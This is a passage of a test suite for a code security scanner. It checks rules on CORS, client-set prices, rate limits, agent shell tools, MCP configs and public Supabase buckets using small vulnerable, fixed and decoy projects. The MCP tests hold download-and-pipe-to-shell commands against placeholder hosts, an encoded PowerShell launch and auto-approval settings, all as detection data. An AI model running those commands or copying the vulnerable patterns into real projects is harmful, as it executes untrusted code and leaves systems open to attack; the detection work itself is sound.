        "app/api/e/[id]/route.ts": route("await db.select().from(notes).where(and(eq(notes.id, params.id), eq(notes.userId, user.id)));", ""),
      }).all,
    ).toEqual(["app/api/d/[id]/route.ts:4 medium", "app/api/p/[id]/route.ts:4 high"]); // no import line in these
  });
  it("leaves handlers with no auth at all to SW-A01, so nothing is reported twice", () => {
    const r = run({
      "app/api/notes/[id]/route.ts":
        "import { supabaseAdmin } from '@/lib/admin';\nexport async function DELETE(req: Request, { params }) {\n  await supabaseAdmin.from('notes').delete().eq('id', params.id);\n}\n",
    });
    expect(r.all).toEqual([]);
    expect(r.a01).toBe(1);
  });
  it("ignores IDs that don't come from the request", () => {
    expect(run({ "app/api/me/route.ts": route("await supabaseAdmin.from('profiles').select().eq('id', user.id).single();") }).all).toEqual([]);
  });
});

describe("SW-P02 price or amount taken from the client", () => {
  const stripeDeps = { "package.json": JSON.stringify({ dependencies: { stripe: "14.0.0" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...stripeDeps, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-P02");
    return { all: mine.map((f) => `${f.file}:${f.line} ${f.confidence}`).sort(), titles: mine.map((f) => f.title).sort() };
  };
  const handler = (body: string) => `export async function POST(req: Request) {\n${body}\n}\n`;

  it("vulnerable: amounts, discounts and fees from the request", () => {
    const r = run({
      "app/api/a/route.ts": handler(
        "  const { amount } = await req.json();\n  await stripe.paymentIntents.create({ amount: Math.round(Number(amount) * 100), currency: 'gbp' });",
      ),
      "app/api/b/route.ts": handler(
        "  const body = await req.json();\n  await stripe.coupons.create({ percent_off: body.discount, duration: 'once' });",
      ),
      "app/actions.ts": "'use server';\nexport async function buy(total: number) {\n  await stripe.checkout.sessions.create({ line_items: [{ price_data: { unit_amount: total } }] });\n}\n",
    });
    expect(r.all).toEqual(["app/actions.ts:3 high", "app/api/a/route.ts:3 high", "app/api/b/route.ts:3 high"]);
  });
  it("a client-chosen price ID is medium", () => {
    expect(
      run({
        "app/api/c/route.ts": handler("  const { priceId } = await req.json();\n  await stripe.checkout.sessions.create({ line_items: [{ price: priceId, quantity: 1 }] });"),
      }).titles,
    ).toEqual(["Stripe price is chosen by the client"]);
  });
  it("fixed: the server picks the price, and the client only names a plan", () => {
    expect(
      run({
        "app/api/d/route.ts": handler(
          "  const PRICES = { pro: 'price_1Pro', team: 'price_1Team' };\n  const { plan, quantity } = await req.json();\n" +
            "  const price = PRICES[plan];\n  if (!price) return new Response(null, { status: 400 });\n" +
            "  await stripe.checkout.sessions.create({ line_items: [{ price, quantity }], client_reference_id: plan });",
        ),
        "app/api/e/route.ts": handler("  await stripe.paymentIntents.create({ amount: 9900, currency: 'gbp' });"),
      }).all,
    ).toEqual([]);
  });
});

describe("SW-A04 CORS that lets any site make credentialed requests", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-A04");
    return { all: mine.map((f) => `${f.file}:${f.line}`).sort(), titles: mine.map((f) => f.title).sort() };
  };
  it("vulnerable: wildcard with credentials, echoed origins and the cors package", () => {
    const r = run({
      "app/api/a/route.ts": "const H = {\n  'Access-Control-Allow-Origin': '*',\n  'Access-Control-Allow-Credentials': 'true',\n};\n",
      "app/api/b/route.ts":
        "export async function GET(req: Request) {\n  const h = new Headers();\n  h.set('Access-Control-Allow-Origin', req.headers.get('origin') ?? '');\n  h.set('Access-Control-Allow-Credentials', 'true');\n}\n",
      "server/app.js": "app.use(cors({ origin: true, credentials: true }));\n",
    });
    expect(r.all).toEqual(["app/api/a/route.ts:2", "app/api/b/route.ts:3", "server/app.js:1"]);
    expect(r.titles).toContain("CORS echoes back any origin, with credentials");
  });
  it("fixed: wildcard without credentials, or an allow-list", () => {
    expect(
      run({
        "app/api/public/route.ts": "const H = { 'Access-Control-Allow-Origin': '*' };\n",
        "app/api/c/route.ts":
          "const ALLOWED = ['https://app.example.com'];\nconst o = req.headers.get('origin');\nif (ALLOWED.includes(o)) h.set('Access-Control-Allow-Origin', o);\nh.set('Access-Control-Allow-Credentials', 'true');\n",
        "server/app.js": "app.use(cors({ origin: ['https://app.example.com'], credentials: true }));\n",
      }).all,
    ).toEqual([]);
  });
});

describe("SW-A03 costly endpoint with no rate limit", () => {
  const next = { "package.json": JSON.stringify({ dependencies: { next: "14.2.3" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...next, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-A03");
    return { all: mine.map((f) => `${f.file}:${f.line}`).sort(), whys: mine.map((f) => f.why) };
  };
  it("vulnerable: AI calls, email and password checks with no limit", () => {
    const r = run({
      "app/api/chat/route.ts": "export async function POST(req: Request) {\n  return Response.json(await openai.chat.completions.create({}));\n}\n",
      "app/api/invite/route.ts": "export async function POST(req: Request) {\n  await resend.emails.send({ to, subject });\n}\n",
      "app/api/login/route.ts": "export async function POST(req: Request) {\n  const ok = await bcrypt.compare(password, user.hash);\n}\n",
      "app/api/notes/route.ts": "export async function GET() { return Response.json([]); }\n",
    });
    expect(r.all).toEqual(["app/api/chat/route.ts:1", "app/api/invite/route.ts:1", "app/api/login/route.ts:1"]);
    expect(r.whys.some((w) => w.includes("paid AI model"))).toBe(true);
  });
  it("fixed: a limiter in the handler, an imported helper, or middleware", () => {
    const chat = "export async function POST(req: Request) {\n  CHECK\n  return Response.json(await openai.chat.completions.create({}));\n}\n";
    expect(run({ "app/api/a/route.ts": chat.replace("CHECK", "const { success } = await ratelimit.limit(ip);") }).all).toEqual([]);
    expect(
      run({
        "lib/limit.ts": "export const guard = new Ratelimit({ limiter: Ratelimit.slidingWindow(10, '1 m') });\n",
        "app/api/b/route.ts": "import { guard } from '@/lib/limit';\n" + chat.replace("CHECK", "await guard.limit(ip);"),
      }).all,
    ).toEqual([]);
    expect(
      run({ "middleware.ts": "const rl = new Ratelimit({});\nexport async function middleware(req) { await rl.limit(ip); }\n", "app/api/c/route.ts": chat.replace("CHECK", "") }).all,
    ).toEqual([]);
  });
});

describe("SW-L03 agent tool with shell, file or code access", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    return all.findings.filter((f) => f.ruleId === "SW-L03").map((f) => `${f.file}:${f.line}`).sort();
  };
  const openaiAgent = (guard = "") =>
    "import { exec } from 'node:child_process';\nconst tools = [{ type: 'function', function: { name: 'run_command', parameters: {} } }];\n" +
    "for (const call of choice.tool_calls) {\n  const { cmd } = JSON.parse(call.function.arguments);\n" + guard + "  exec(cmd);\n}\n";

  it("vulnerable: OpenAI tool calls and AI SDK execute functions", () => {
    expect(
      run({
        "lib/agent.ts": openaiAgent(),
        "lib/sdk.ts":
          "import fs from 'node:fs';\nexport const tools = { removeFile: tool({ description: 'Delete a file', parameters: z.object({ path: z.string() }),\n" +
          "  execute: async ({ path }) => fs.promises.rm(path) }) };\n",
      }),
    ).toEqual(["lib/agent.ts:2", "lib/agent.ts:5", "lib/sdk.ts:3"]);
  });
  it("fixed: an allow-list or a confirmation step", () => {
    expect(run({ "lib/agent.ts": openaiAgent("  if (!ALLOWED_COMMANDS.has(cmd)) throw new Error('no');\n") })).toEqual([]);
    expect(run({ "lib/agent.ts": openaiAgent("  if (!(await confirm(cmd))) return;\n") })).toEqual([]);
  });
  it("ignores tools whose arguments never reach a shell, and shells that run fixed commands", () => {
    expect(
      run({
        "lib/a.ts": "const tools = [{ type: 'function', function: { name: 'get_weather' } }];\nconst { city } = JSON.parse(call.function.arguments);\nawait fetchWeather(city);\n",
        "lib/b.ts": "import { exec } from 'node:child_process';\nconst tools = [{ name: 'run_tests' }];\nif (choice.tool_calls.length) exec('npm test');\n",
      }),
    ).toEqual([]);
  });
});

describe("SW-L04 MCP server config", () => {
  const mcp = { "package.json": JSON.stringify({ dependencies: { "@modelcontextprotocol/sdk": "1.0.0" } }) };
  const run = (config: object, name = ".cursor/mcp.json") => {
    const p = project({ ...mcp, [name]: JSON.stringify(config, null, 2) });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-L04");
    return { all: mine.map((f) => `${f.file}:${f.line}`).sort(), titles: mine.map((f) => f.title).sort() };
  };
  it("vulnerable: secrets in args, env and headers, and open remote servers", () => {
    const r = run({
      mcpServers: {
        db: { command: "npx", args: ["server-postgres", `postgres://app:${rand(16)}@db.example.net/app`] },
        stripe: { command: "npx", env: { STRIPE_SECRET_KEY: `sk_live_${rand(30)}` } },
        api: { url: "https://mcp.example.net/sse", headers: { Authorization: `Bearer ${rand(32)}` } },
        open: { url: "http://10.0.0.5:8931/sse" },
      },
    });
    expect(r.titles).toEqual([
      'MCP server "api" has a credential in plain text',
      'MCP server "db" has a database password in plain text',
      'MCP server "open" is reached over plain HTTP with no authentication',
      'MCP server "stripe" has a live secret key (Stripe or Clerk) in plain text',
    ]);
  });
  it("fixed: environment references, local servers and authenticated remotes", () => {
    expect(
      run(
        {
          servers: {
            db: { command: "npx", args: ["server-postgres", "${env:DATABASE_URL}"] },
            gh: { command: "npx", env: { GITHUB_TOKEN: "${GITHUB_TOKEN}", LOG_LEVEL: "debug" } },
            local: { url: "http://127.0.0.1:8931/sse" },
            remote: { url: "https://mcp.example.net/sse", headers: { Authorization: "Bearer ${env:MCP_TOKEN}" } },
          },
        },
        ".vscode/mcp.json",
      ).all,
    ).toEqual([]);
  });
});

describe("SW-L05 MCP servers auto-approved or launched through a shell", () => {
  const L05 = resolve(__dirname, "../fixtures/rules/sw-l05");
  /**
   * Copies a fixture folder into a throwaway project. `claude-settings*.json` become
   * `.claude/settings*.json`, so the repo itself never commits a live Claude Code settings file.
   */
  const fixture = (name: string) => {
    const dir = join(L05, name);
    const files: Record<string, string> = {};
    for (const f of readdirSync(dir, { recursive: true, withFileTypes: true })) {
      if (!f.isFile()) continue;
      const rel = join(f.parentPath ?? f.path, f.name).slice(dir.length + 1).split("\\").join("/");
      files[rel.replace(/^claude-(settings(\.local)?\.json)$/, ".claude/$1")] = readFileSync(join(dir, rel), "utf8");
    }
    return files;
  };
  /** SW-L05 findings at any confidence, as "file:line severity/confidence". */
  const run = (files: Record<string, string>, config: typeof DEFAULT_CONFIG = { ...DEFAULT_CONFIG, minConfidence: "low" }) => {
    const p = project(files);
    const r = scan(p.root, config, RULES);
    p.done();
    const findings = r.findings.filter((f) => f.ruleId === "SW-L05");
    return { all: findings.map((f) => `${f.file}:${f.line} ${f.severity}/${f.confidence}`), findings };
  };
  const settings = (o: object) => ({ ".claude/settings.json": JSON.stringify(o, null, 2) });
  const server = (s: object) => ({ "mcp.json": JSON.stringify({ mcpServers: { tools: s } }, null, 2) });
  const lines = (files: Record<string, string>) => run(files).all.map((s) => s.replace(/ .*/, ""));

  it("vulnerable fixture: auto-approval, a curl | sh launch and a shell wrapper, with file and line", () => {
    const r = run(fixture("vulnerable"));
    expect(r.all).toEqual([".claude/settings.json:5 medium/high", "mcp.json:9 low/high", "mcp.json:12 low/medium"]);
    const [auto, pipe, wrapper] = r.findings;
    expect(auto!.title).toBe("Claude Code is set to approve every MCP server in the repo's .mcp.json");
    expect(auto!.why).toContain('.claude/settings.json sets "enableAllProjectMcpServers": true, so once you trust this folder');
    expect(auto!.fix).toContain('"enableAllProjectMcpServers": true');
    expect(auto!.fix).toContain("enabledMcpjsonServers");
    expect(pipe!.title).toBe('MCP server "deploy-tools" downloads a script and pipes it to a shell every time it starts');
    expect(pipe!.why).toContain("curl -fsSL https://example.invalid/mcp/install.sh | sh");
    expect(wrapper!.title).toBe('MCP server "notes" is launched through a shell (sh -c)');
    expect(wrapper!.why).toContain('`sh -c "cd tools/notes && node server.js"`');
    for (const f of r.findings) {
      expect(f.fixPrompt).toContain(
        "Remove auto-approval of project MCP servers and replace shell-wrapper launch commands with a direct, version-pinned command",
      );
      expect(f.column).toBeGreaterThan(1);
    }
    expect(auto!.fixPrompt).toContain(".claude/settings.json");
    expect(pipe!.fixPrompt).toContain('"deploy-tools"');
  });
  it("vulnerable fixture: the plain shell wrapper is medium confidence, so hidden by default", () => {
    expect(run(fixture("vulnerable"), DEFAULT_CONFIG).all).toEqual([".claude/settings.json:5 medium/high", "mcp.json:9 low/high"]);
  });
  it("fixed fixture: the setting false or absent, and direct commands with args", () => {
    expect(Object.keys(fixture("fixed")).sort()).toEqual([".claude/settings.json", ".claude/settings.local.json", "mcp.json"]);
    expect(run(fixture("fixed")).all).toEqual([]);
  });
  it("decoy fixture: unpinned npx, node server.js, and the key only in a comment or string", () => {
    expect(run(fixture("decoy")).all).toEqual([]);
  });

  it("vulnerable: settings.local.json, a package's own .claude folder, and JSON with comments", () => {
    const local = run({ ".claude/settings.local.json": '{ "enableAllProjectMcpServers": true }' });
    expect(local.all).toEqual([".claude/settings.local.json:1 medium/high"]);
    expect(local.findings[0]!.why).toContain("if it is committed, the setting applies to everyone who clones the repo");
    expect(lines({ "apps/web/.claude/settings.json": '{\n  "enableAllProjectMcpServers" : true\n}' })).toEqual(["apps/web/.claude/settings.json:2"]);
    expect(
      lines({ ".claude/settings.json": '{\n  // "enableAllProjectMcpServers": false\n  "model": "x", /* note */\n  "enableAllProjectMcpServers": true\n}' }),
    ).toEqual([".claude/settings.json:4"]);
  });
  it("vulnerable: is reported even before the repo has an .mcp.json", () => {
    expect(lines({ ...settings({ enableAllProjectMcpServers: true }), "package.json": "{}" })).toEqual([".claude/settings.json:2"]);
  });
  it("decoy: false, a string, a nested key, broken JSON, or another tool's settings", () => {
    expect(lines(settings({ enableAllProjectMcpServers: false }))).toEqual([]);
    expect(lines(settings({ enableAllProjectMcpServers: "true" }))).toEqual([]);
    expect(lines(settings({ permissions: { enableAllProjectMcpServers: true } }))).toEqual([]);
    expect(lines({ ".claude/settings.json": '{ "enableAllProjectMcpServers": true, }}' })).toEqual([]);
    expect(lines({ ".vscode/settings.json": '{ "enableAllProjectMcpServers": true }' })).toEqual([]);
    expect(lines({ "claude-settings.json": '{ "enableAllProjectMcpServers": true }' })).toEqual([]);
  });

  it("vulnerable: wget, bash -lc, a shell given by path, and a whole command line in command", () => {
    expect(run(server({ command: "sh", args: ["-c", "wget -qO- https://example.invalid/i | bash"] })).all).toEqual(["mcp.json:7 low/high"]);
    expect(run(server({ command: "/bin/bash", args: ["-lc", "cd srv && npm start"] })).all).toEqual(["mcp.json:4 low/medium"]);
    const whole = run(server({ command: "bash -c 'curl -sL https://example.invalid/i | sudo bash'" }));
    expect(whole.all).toEqual(["mcp.json:4 low/high"]);
    expect(whole.findings[0]!.why).toContain("runs `curl -sL https://example.invalid/i | sudo bash` on start");
    expect(run(server({ command: "zsh", args: ["-c", "node s.js"] })).findings[0]!.title).toBe('MCP server "tools" is launched through a shell (zsh -c)');
    const env = run(server({ command: "/usr/bin/env", args: ["-i", "HOME=/tmp", "bash", "-c", "node tools.js"] }));
    expect(env.all).toEqual(["mcp.json:4 low/medium"]);
    expect(env.findings[0]!.why).toContain('`bash -c "node tools.js"`');
    expect(lines(server({ command: "env", args: ["NODE_ENV=production", "node", "server.js", "-c", "x"] }))).toEqual([]);
  });
  it("vulnerable: Windows shells", () => {
    expect(run(server({ command: "cmd", args: ["/c", "cd srv && node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "cmd.exe", args: ["/C", "npx -y pkg@1.0.0 > log.txt"] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "powershell.exe", args: ["-Command", "node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "pwsh", args: ["-enc", "ZQBjAGgAbwA="] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "PowerShell", args: ["-NoProfile", "-c", "irm https://example.invalid/i | iex"] })).all).toEqual([
      "mcp.json:8 low/high",
    ]);
  });
  it("decoy: shells running a script file, unpinned npx and uvx, docker, and look-alike names", () => {
    expect(lines(server({ command: "bash", args: ["scripts/start-mcp.sh"] }))).toEqual([]);
    expect(lines(server({ command: "npx", args: ["-y", "some-mcp-server"] }))).toEqual([]);
    expect(lines(server({ command: "uvx", args: ["mcp-server-fetch"] }))).toEqual([]);
    expect(lines(server({ command: "docker", args: ["run", "-i", "--rm", "ghcr.io/example/mcp:1.2.0"] }))).toEqual([]);
    expect(lines(server({ command: "node", args: ["server.js", "-c", "config.json"] }))).toEqual([]);
    expect(lines(server({ command: "shellcheck-mcp", args: ["-c"] }))).toEqual([]);
    // Options after the script file belong to the script, not the shell.
    expect(lines(server({ command: "bash", args: ["./start.sh", "-c", "config.yml"] }))).toEqual([]);
    expect(lines(server({ command: "bash", args: ["-l", "./start.sh", "-c", "config.yml"] }))).toEqual([]);
    expect(lines(server({ command: "pwsh", args: ["-File", "start.ps1", "-c", "x"] }))).toEqual([]);
    expect(lines(server({ command: "powershell", args: ["-NoProfile", "-f", "start.ps1", "-Command", "x"] }))).toEqual([]);
    // The usual way to start an npx server on Windows.
    expect(lines(server({ command: "cmd", args: ["/c", "npx", "-y", "@modelcontextprotocol/server-github"] }))).toEqual([]);
    expect(lines(server({ url: "https://mcp.example.net/sse", headers: { Authorization: "Bearer ${env:T}" } }))).toEqual([]);
  });
  it("decoy: a download-and-pipe string passed as an argument that no shell runs", () => {
    const banner = "curl https://example.invalid | sh";
    expect(lines(server({ command: "node", args: ["server.js", "--banner", banner] }))).toEqual([]);
    expect(lines(server({ command: "npx", args: ["-y", "pkg@1.0.0", banner] }))).toEqual([]);
    expect(lines(server({ command: "bash", args: ["./start.sh", banner] }))).toEqual([]);
    // Only the word after `-c` is run; later words are $0, $1 ...
    expect(run(server({ command: "sh", args: ["-c", "node s.js", banner] })).all).toEqual(["mcp.json:4 low/medium"]);
  });
  it("vulnerable: pipes that a shell does run", () => {
    expect(run(server({ command: "sh", args: ["-ec", "curl -fsSL https://example.invalid/i|bash -s -- --yes"] })).all).toEqual([
      "mcp.json:7 low/high",
    ]);
    // Split over several args, it is reported at the first word cmd runs ("curl", on line 7).
    expect(run(server({ command: "cmd.exe", args: ["/c", "curl", "https://example.invalid/i", "|", "sh"] })).all).toEqual([
      "mcp.json:7 low/high",
    ]);
    expect(run(server({ command: "cmd.exe", args: ["/c", "npx", "-y", "pkg", "|", "more"] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "pwsh", args: ["-EncodedCommand", "ZQBjAGgAbwA="] })).all).toEqual(["mcp.json:4 low/medium"]);
  });
  it("vulnerable: shell options before the run-a-command flag", () => {
    expect(run(server({ command: "bash", args: ["-o", "pipefail", "-c", "node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "bash", args: ["--norc", "-e", "-c", "node s.js"] })).all).toEqual(["mcp.json:4 low/medium"]);
    expect(run(server({ command: "pwsh", args: ["-ExecutionPolicy", "Bypass", "-Command", "node s.js"] })).all).toEqual([
      "mcp.json:4 low/medium",
    ]);
  });
  it("finds the shell wrapper in every MCP config SW-L04 reads", () => {
    const s = { mcpServers: { tools: { command: "bash", args: ["-c", "node s.js"] } } };
    for (const name of [".mcp.json", ".cursor/mcp.json", ".vscode/mcp.json", "claude_desktop_config.json"]) {
      expect(lines({ [name]: JSON.stringify(s, null, 2) }), name).toEqual([`${name}:4`]);
    }
    expect(lines({ ".vscode/mcp.json": JSON.stringify({ servers: s.mcpServers }, null, 2) })).toEqual([".vscode/mcp.json:4"]);
  });
  it("honours seaworthy-ignore in settings with comments", () => {
    const p = project({ ".claude/settings.json": '{\n  // seaworthy-ignore SW-L05 sandbox VM only\n  "enableAllProjectMcpServers": true\n}' });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.findings.filter((f) => f.ruleId === "SW-L05")).toEqual([]);
    expect(r.suppressed.map((f) => `${f.ruleId} ${f.file}:${f.line}`)).toEqual(["SW-L05 .claude/settings.json:3"]);
  });
});

describe("SW-B01 reads proxy config too", () => {
  it("counts headers set in nginx, wherever the config lives", () => {
    const p = project({
      "frontend/package.json": JSON.stringify({ dependencies: { next: "14.2.3" } }),
      "frontend/next.config.js": "module.exports = {};\n",
      "infrastructure/docker/nginx.azure.conf":
        "add_header Content-Security-Policy \"default-src 'self'\";\nadd_header X-Frame-Options DENY;\nadd_header Strict-Transport-Security max-age=63072000;\n",
    });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.findings.filter((f) => f.ruleId === "SW-B01")).toEqual([]);
  });
});

describe("findings from scanning real projects (10 Nov 2026)", () => {
  it("masks a database password that contains @", () => {
    const pw = `P@ss${rand(10)}`;
    expect(redact(`url: "postgresql://admin:${pw}@db.example.net:5432/app"`)).not.toContain(pw.slice(1));
  });
  it("rates a password for a Docker-internal host as medium", () => {
    const p = project({ "scripts/report.py": `DB = "postgresql://postgres:${rand(14)}@etl-postgres:5432/analytics"\n` });
    const r = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    expect(r.findings.filter((f) => f.ruleId === "SW-S01").map((f) => f.confidence)).toEqual(["medium"]);
  });
  it("SW-A01 leaves login endpoints, CAPTCHA forms and cookie-checked routes alone, and rates proxies medium", () => {
    const p = project({
      "package.json": JSON.stringify({ dependencies: { next: "14.2.3" } }),
      "app/api/deck-auth/route.ts": "export async function POST(req) { const ok = check(code); }\n",
      "app/api/apply/route.ts": "export async function POST(req) { await verifyRecaptchaToken(t); await db.insert(row); }\n",
      "app/api/upload/route.ts": "export async function POST(req) { const s = req.cookies.get(PARTNER_AUTH_COOKIE)?.value; await db.insert(x); }\n",
      "app/api/login-portal/route.ts": "export async function POST(req) { res.cookies.set(SESSION_COOKIE, token); }\n",
      "app/api/graph/run/route.ts":
        "const API = process.env.SERVER_API_URL;\nexport async function POST(req) { return fetch(`${API}/run`, { method: 'POST' }); }\n",
      "app/api/sim/route.ts": "export async function POST(req) { return Response.json({ answer: simulate() }); }\n",
    });
    const r = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    expect(r.findings.filter((f) => f.ruleId === "SW-A01").map((f) => `${f.file} ${f.confidence}`).sort()).toEqual([
      "app/api/graph/run/route.ts medium",
      "app/api/sim/route.ts medium",
    ]);
  });
});

describe("SW-A04 in nginx config", () => {
  const run = (conf: string) => {
    const p = project({ "services/gateway/nginx.conf": conf });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    return r.findings.filter((f) => f.ruleId === "SW-A04").map((f) => `${f.line} ${f.title}`);
  };
  it("flags a reflected origin with credentials", () => {
    expect(run("location /api {\n  add_header Access-Control-Allow-Origin $http_origin always;\n  add_header Access-Control-Allow-Credentials \"true\" always;\n}\n")).toEqual([
      "2 nginx echoes back any origin, with credentials",
    ]);
  });
  it("accepts an origin allow-list", () => {
    expect(
      run("map $http_origin $cors { default \"\"; \"https://app.example.com\" $http_origin; }\nadd_header Access-Control-Allow-Origin $http_origin;\nadd_header Access-Control-Allow-Credentials true;\n"),
    ).toEqual([]);
  });
});

describe("SW-D04 Supabase public buckets", () => {
  const supa = { "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "2.45.0" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...supa, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    return all.findings.filter((f) => f.ruleId === "SW-D04").map((f) => `${f.file}:${f.line} ${f.severity} ${f.confidence} ${f.title}`).sort();
  };
  const mig = "supabase/migrations/0001_storage.sql";

  it("flags public buckets for private files in SQL, medium for vague names, and leaves image buckets alone", () => {
    expect(
      run({
        [mig]:
          "-- buckets\ninsert into storage.buckets (id, name, public, allowed_mime_types)\nvalues\n  ('invoices', 'invoices', true, array['application/pdf']),\n  ('avatars', 'avatars', true, null),\n  ('uploads', 'uploads', true, null),\n  ('secure-docs', 'secure-docs', false, null)\non conflict (id) do nothing;\n",
      }),
    ).toEqual([
      `${mig}:4 high high Supabase storage bucket "invoices" is public`,
      `${mig}:6 medium medium Supabase storage bucket "uploads" is public`,
    ]);
  });

  it("follows later migrations: made private, made public, deleted", () => {
    expect(
      run({
        "supabase/migrations/0001_a.sql": "insert into storage.buckets (id, name, public) values ('contracts', 'contracts', true);\ninsert into storage.buckets (id, name, public) values ('kyc-scans', 'kyc-scans', false);\ninsert into storage.buckets (id, name, public) values ('statements', 'statements', true);\n",
        "supabase/migrations/0002_b.sql": "update storage.buckets set public = false where id = 'contracts';\nupdate storage.buckets set public = true where id = 'kyc-scans';\ndelete from storage.buckets where id = 'statements';\n",
      }),
    ).toEqual([`supabase/migrations/0002_b.sql:2 high high Supabase storage bucket "kyc-scans" is public`]);
  });

  it("reads supabase/config.toml and createBucket calls, including seed.sql", () => {
    expect(
      run({
        "supabase/config.toml": "[storage]\nenabled = true\n\n[storage.buckets.receipts]\npublic = true\nfile_size_limit = \"50MiB\"\n\n[storage.buckets.images]\npublic = true\n\n[storage.buckets.private-files]\npublic = false\n",
        "scripts/setup.ts": 'await supabase.storage.createBucket("medical-records", { public: true, fileSizeLimit: 1024 });\nawait supabase.storage.createBucket("thumbnails", { public: true });\nawait supabase.storage.createBucket("passports", { public: false });\n',
        "supabase/seed.sql": "insert into storage.buckets (id, name, public) values ('payslips', 'payslips', true);\n",
      }),
    ).toEqual([
      `scripts/setup.ts:1 high high Supabase storage bucket "medical-records" is public`,
      `supabase/config.toml:4 high high Supabase storage bucket "receipts" is public`,
      `supabase/seed.sql:1 high high Supabase storage bucket "payslips" is public`,
    ]);
  });

  it("a private bucket is clean, and a supabase/ folder alone is enough to turn the check on", () => {
    expect(run({ [mig]: "insert into storage.buckets (id, name, public) values ('invoices', 'invoices', false);\n" })).toEqual([]);
    const p = project({ [mig]: "insert into storage.buckets (id, name, public) values ('invoices', 'invoices', true);\n" });
    const noStack = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    // supabase/ alone is enough to detect the stack, so this project still counts as Supabase.
    expect(noStack.findings.some((f) => f.ruleId === "SW-D04")).toBe(true);
  });
});
